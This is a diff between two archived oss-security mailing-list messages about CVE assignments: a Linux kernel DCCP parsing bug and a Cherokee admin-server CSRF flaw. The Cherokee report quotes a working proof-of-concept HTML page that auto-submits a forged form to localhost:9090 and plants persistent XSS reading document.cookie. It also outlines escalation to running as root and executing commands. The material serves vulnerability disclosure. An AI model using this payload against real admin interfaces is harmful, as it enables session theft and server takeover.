@@ -1,26 +1,72 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/05/09/1
-Message-ID: <4DC74A8A.5080108@redhat.com>
-Date: Mon, 09 May 2011 09:59:38 +0800
-From: Eugene Teo <eugene@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/06/22
+Message-ID: <1034398767.510283.1307389066776.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Mon, 6 Jun 2011 15:37:46 -0400 (EDT)
+From: Josh Bressers <bressers@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: Dan Rosenberg <dan.j.rosenberg@...il.com>
-Subject: Re: CVE request: kernel: DCCP invalid options
+Cc: Alvaro Lopez Ortega <alvaro@...ality.com>, coley <coley@...re.org>
+Subject: Re: Security issue in cherokee
 Content-Type: text/plain; charset=utf-8
 
-On 05/09/2011 02:54 AM, Dan Rosenberg wrote:
-> On a providing a bad option length for certain DCCP options, a remote
-> host may cause parsing to read beyond the bounds of the incoming
-> packet.  This may possibly cause a DoS by reading unmapped memory (if
-> you're unlucky), or it may allow an attacker to infer the contents of
-> kernel heap memory based on the parser's response.
->
-> -Dan
->
-> [1] http://marc.info/?l=linux-kernel&m=130468845209036&w=2
+As best as I can tell, this is the same request from Jan on 2011-06-02.
 
-Use CVE-2011-1770.
+Please use CVE-2011-2191
 
-https://bugzilla.redhat.com/CVE-2011-1770
+Thanks.
 
-Thanks, Eugene
+-- 
+    JB
+
+----- Original Message -----
+> A security bug was reported against cherokee in Ubuntu. You are being
+> emailed as the upstream contact. Please keep oss-security[1] CC'd for
+> any updates on this issue.
+> 
+> This issue should be considered public, but has not yet been assigned
+> a
+> CVE. Once a CVE is assigned, please mention it in any changelogs.
+> 
+> Details from the public bug follow:
+> https://launchpad.net/bugs/784632
+> 
+> From the reporter:
+> ----
+> The cherokee admin server is vulnerable to csrf.
+> 
+> Using csrf it is possible to produce a persistent xss in several pages
+> -
+> including the 'status' page via the 'nickname field' of a vserver.
+> An example of this is the following:
+> 
+> <html>
+> <body>
+> <form action="http://127.0.0.1:9090/vserver/apply" method="post"
+> id="xssform">
+> <input type="text" name="tmp!new_droot" value='/var/www/'></input>
+> <input type="text" name="tmp!new_nick" value='" onselect=alert(1)
+> autofocus> <embed src="javascript:alert(document.cookie)">'></input>
+> </form>
+> <script>document.getElementById("xssform").submit();</script>
+> </body>
+> 
+> A Worst case scenario could be something like the following:
+> If a user is logged in and the cherokee admin server is running on
+> localhost:9090 then if they visit a $bad page - the bad page may be
+> able
+> to send requests to the server so as to reconfigure it to:
+> 
+> 1. run as root
+> 2. the logging of error(or access) will run a command ...
+> ----
+> 
+> Thanks in advance for your cooperation in coordinating a fix for this
+> issue,
+> 
+> Jamie Strandboge
+> 
+> [1] oss-security@...ts.openwall.com is a public mailing list for
+> people to collaborate on security vulnerabilities and coordinate
+> security updates.
+> 
+> --
+> Jamie Strandboge | http://www.canonical.com
